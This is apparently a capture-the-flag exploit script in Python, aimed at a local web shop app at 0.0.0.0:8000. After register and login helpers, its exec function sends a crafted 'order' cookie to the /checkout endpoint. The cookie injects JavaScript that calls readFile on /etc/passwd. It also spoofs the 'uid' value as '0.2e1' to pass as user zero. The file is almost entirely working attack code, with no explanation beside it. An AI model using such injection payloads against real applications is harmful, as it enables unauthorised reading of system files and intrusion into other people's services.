from http.cookiejar import Cookie
import requests
from requests import cookies

TARGET_URL = 'http://0.0.0.0:8000'
def register(user,pw):
    data = {
        "username":user,
        "password":pw
    }

    res=requests.post(f"{TARGET_URL}/register",json=data)

def login(user,pw):
    s = requests.Session()
    
    data = {
        "username":user,
        "password":pw
    }

    res=s.post(f"{TARGET_URL}/login",json=data)

    return s

def exec(a,b):
    #data={
    #    "a" : a,
    #    "b" : b
    #}
    #s.post(f"{TARGET_URL}/buy/sum",json=data)
    #print(s.cookies.get_dict())
    cookie={
        "order":"1,1,2])%3ba=readFile`/etc/passwd`%3ba.constructor//",
        "uid":"0.2e1",
        "passwd":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    }
    res=requests.get(f"{TARGET_URL}/checkout",cookies=cookie)
    print(res.text)

exec('1','2')